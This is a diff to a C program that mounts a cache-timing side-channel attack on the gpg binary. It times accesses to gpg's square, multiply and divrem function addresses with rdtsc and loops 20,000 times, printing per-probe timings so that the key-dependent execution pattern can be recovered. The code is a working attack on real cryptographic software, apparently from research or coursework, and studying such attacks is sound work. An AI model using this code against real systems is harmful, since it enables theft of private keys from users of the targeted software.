@@ -32,10 +32,10 @@ int probe(char* addr){
 
     );
 
-    return time < THRESHOLD;
+    return time;
 }
 void busy_wait(){
-    for(int i =0; i<50000; i++){
+    for(int i =0; i<1000; i++){
          asm __volatile__(
         "nop\n\t"
         );
@@ -43,20 +43,36 @@ void busy_wait(){
 
 }
 
-void time(){
-  volatile unsigned int time;
+void nop(){
+         asm __volatile__(
+        "nop\n\t"
+        "nop\n\t"
+        "nop\n\t"
+        "nop\n\t"
+        "nop\n\t"
+        "nop\n\t"
+        "nop\n\t"
+        "nop\n\t"
+        "nop\n\t"
+        "nop\n\t"
+        );
+
+}
+
+u_int64_t time(){
+  u_int64_t a,d;
 
    asm __volatile__(
         "mfence\n\t"
         "rdtsc\n\t"
-        "lfence\n\t"
+        "mfence\n\t"
 
-        :"=a"(time)
+        :"=a"(a),"=d"(d)
         :
         :
     );
 
-   return time;
+   return (d<<32) | a;
 }
 int main(void){
     int fp = open("/usr/local/bin/gpg", O_RDONLY);
@@ -73,31 +89,38 @@ int main(void){
    int mul_addr = 0x9fd80;
    int divrem_addr = 0x9e57c;
 
-
-   unsigned int first = time();
+/*
+  u_int64_t first = time();
    int sqr = probe(file_addr + sqr_addr);
    int mul = probe(file_addr + mul_addr);
    int divrem = probe(file_addr + divrem_addr);
-   unsigned int second = time();
+   u_int64_t second = time();
+   u_int64_t diff = second -first;
 
-   printf("first %u\n",first);
-   printf("second %u\n",second);
-
-   for(int i=0;i< 5000;i++){
+   printf("first %lu\n",first);
+   printf("second %lu\n",second);
+   printf("cycles %lu\n",diff);
+   
+   // nops
+   
+   first = time();
+   for(int i=0;i<100;i++){nop();}
+   second = time();
+   diff = second -first;
+   printf("wait %lu\n",diff);
+*/
+   for(int i=0;i< 20000;i++){
        int sqr = probe(file_addr + sqr_addr);
        int mul = probe(file_addr + mul_addr);
        int divrem = probe(file_addr + divrem_addr);
 
-       if(sqr && mul && divrem){
-           printf("1");
-       }else{
-           printf("0");
-       }
+       printf("%d,%d,%d\n",sqr,mul,divrem);
        // busy wait
-       busy_wait();
+       for(int i=0;i<100;i++){nop();}
 
 
    }
+   
     return 0;
 }
 
